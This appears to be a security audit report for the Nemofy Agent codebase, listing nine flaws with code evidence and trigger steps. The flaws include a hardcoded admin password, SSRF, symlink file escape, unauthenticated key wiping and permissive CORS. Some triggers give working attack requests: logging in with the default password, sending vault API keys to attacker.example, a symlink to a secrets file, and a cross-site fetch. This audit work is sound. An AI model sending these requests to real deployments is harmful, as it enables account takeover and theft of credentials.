claim: Hardcoded default administrator password is seeded whenever NEMOFY_ADMIN_PASSWORD is unset, and its unsalted SHA-256 digest is embedded in the client bundle.
evidence: server/authStore.ts:21-22 defines DEFAULT_PASSWORD = process.env.NEMOFY_ADMIN_PASSWORD || 'Rahul1234$' and seeds admin in loadOrSeed() (lines 78-88) when data/auth.json does not exist. NEMOFY_ADMIN_PASSWORD is also omitted from .env.example. Nemofy Agent/src/lib/authValidation.ts:3-4 embeds DEFAULT_STANDALONE_CREDENTIAL_DIGEST for the same default credential.
runtimeTrigger: On any fresh deployment where NEMOFY_ADMIN_PASSWORD is not configured, an unauthenticated remote attacker sends POST /api/auth/login with {"username":"admin","password":"Rahul1234$"} and obtains full administrator session access to workspace files, encrypted vault operations, and Agent-Core execution.

claim: Unauthenticated POST /api/auth/logout clears all active provider API keys inside the running Agent-Core process.
evidence: server.ts:264-268 mounts app.post('/api/auth/logout', ...) without requireSession or isSameOriginMutation and unconditionally invokes callAgentCore('/config/secrets', { method: 'DELETE' }), which triggers Agent-Core/agent_core/api.py:455-460 to clear app.state.profile_secrets and pop every provider API key from os.environ.
runtimeTrigger: Any unauthenticated client or cross-site web page issues POST /api/auth/logout, immediately wiping all hydrated LLM API keys from Agent-Core and causing active/subsequent authenticated agent runs to fail with missing API key errors.

claim: Arbitrary base_url in /api/settings/models and /api/settings/probe enables SSRF and exfiltration of decrypted profile vault API keys to attacker-controlled hosts.
evidence: server.ts:1252-1300 passes caller-supplied base_url and decrypted profileSecrets into listProviderModelsDirect (server/providerCatalog.ts:288-311) and probeProviderModelDirect (lines 391-450). Only /^https?:\/\//i is checked; no private/loopback/metadata IP blocking or host allowlist is enforced, and resolveProviderApiKey (lines 80-103) attaches the decrypted server-side vault API key in Authorization/x-api-key headers to the arbitrary base_url.
runtimeTrigger: An authenticated caller (or XSS payload) sends POST /api/settings/models with {"provider":"openai","base_url":"https://attacker.example/v1"} (omitting api_key) to receive the decrypted OPENAI_API_KEY in the Authorization header on attacker.example, or sets base_url to http://169.254.169.254/latest/meta-data to probe internal/metadata endpoints.

claim: Workspace filesystem API resolves paths lexically without resolving symbolic links, allowing arbitrary host file read/write via symlinks inside /workspace.
evidence: server/configStore.ts:524-538 resolveWorkspacePath uses path.resolve(this.workspaceDir, clean) and never calls fs.realpathSync on existing targets or parent directories. readWorkspaceFile (lines 710-737), writeWorkspaceFile (lines 739-749), and listWorkspaceDirectory (lines 641-708) pass this lexical path directly to fs.statSync/readFileSync/writeFileSync/readdirSync, which follow symlinks out of /workspace.
runtimeTrigger: If a symbolic link inside workspace/ points outside workspace/ (for example created via bash_exec 'ln -s ../data/auth.json leak.json', which is allowed as SAFE by guardrails.py and not blocked by _LOCAL_ESCAPE_PATTERNS in sandbox.py), GET /api/filesystem/file?path=leak.json returns data/auth.json (including sessionSecret and vaultMasterSecret), and PUT /api/filesystem/file overwrites the symlink target.

claim: Stale threads array loaded before awaiting long-running Agent-Core execution overwrites data/threads.json on completion, silently dropping concurrent threads and messages.
evidence: In POST /api/chat/send (server.ts:462), threads is read from disk before awaiting callAgentCore('/agent/run') (line 512, up to 120s timeout), then the same stale threads array is written back at lines 558 and 596 via store.saveThreads(threads). POST /api/chat/jobs/start has the same pattern between line 677 and error write at line 774.
runtimeTrigger: Start a request via POST /api/chat/send on thread A; while Agent-Core is executing, create thread B (POST /api/threads) or add a message in thread C; when thread A finishes, store.saveThreads(threads) overwrites data/threads.json with the pre-run snapshot, deleting thread B and thread C's new messages.

claim: parseCookieHeader calls decodeURIComponent without error handling, causing uncaught URIError 500 failures on any request with a malformed percent-encoded cookie.
evidence: server/authStore.ts:201 executes decodeURIComponent(part.slice(idx + 1).trim()) with no try/catch for every cookie in the Cookie header. extractSessionToken (server.ts:96) calls parseCookieHeader on /api/auth/me and every requireSession route.
runtimeTrigger: Send GET /api/auth/me with header 'Cookie: any=%E0%A4%A'; decodeURIComponent throws URIError: URI malformed, returning HTTP 500 instead of treating the cookie as invalid or unauthenticated.

claim: Stateless session tokens are never invalidated on logout, remaining valid for their full 24-hour TTL after the user signs out.
evidence: AuthStore.createSessionToken signs {username, issuedAt, expiresAt, version: updatedAt} with sessionSecret, and verifySessionToken checks only signature, expiry, and updatedAt. server.ts:264-268 POST /api/auth/logout only clears the browser cookie and never rotates sessionSecret or records a revoked token/generation.
runtimeTrigger: Sign in to obtain a session token (Bearer or nemofy_session cookie), call POST /api/auth/logout, and replay the same token on GET /api/threads or GET /api/filesystem/tree; the request still succeeds with HTTP 200 for up to 24 hours.

claim: Chat send and job-start endpoints persist the user message and newly created thread to disk before validating that a Primary model is configured.
evidence: In POST /api/chat/send (server.ts:480-497) and POST /api/chat/jobs/start (server.ts:695-712), userMsg is pushed onto thread.messages and persisted via store.saveThreads(threads) before checking if (!llmCfg.primary.model.trim()), which then aborts with HTTP 400.
runtimeTrigger: Clear the Primary model in Settings, then submit a chat message via POST /api/chat/jobs/start; the server responds with HTTP 400 error, yet reloads show the rejected user message permanently saved (and duplicated on each retry) in data/threads.json.

claim: FastAPI CORSMiddleware defaults to allow_origins=['*'] with allow_credentials=True, reflecting any untrusted Origin header on all endpoints including unauthenticated /health.
evidence: Agent-Core/agent_core/api.py:316-327 defaults CORS_ALLOW_ORIGINS to '*' while setting allow_credentials=True. In Starlette CORSMiddleware, wildcard origin combined with allow_credentials=True reflects the request Origin header with Access-Control-Allow-Credentials: true. GET /health (lines 384-420) has no authentication and returns host workspace_dir, checkpoint.path, config_path, and MCP tool names.
runtimeTrigger: Any malicious website visited by a developer running Nemofy Agent locally executes fetch('http://127.0.0.1:8100/health', {credentials:'include'}) and reads the JSON response containing local filesystem paths, configured models, and MCP server metadata.
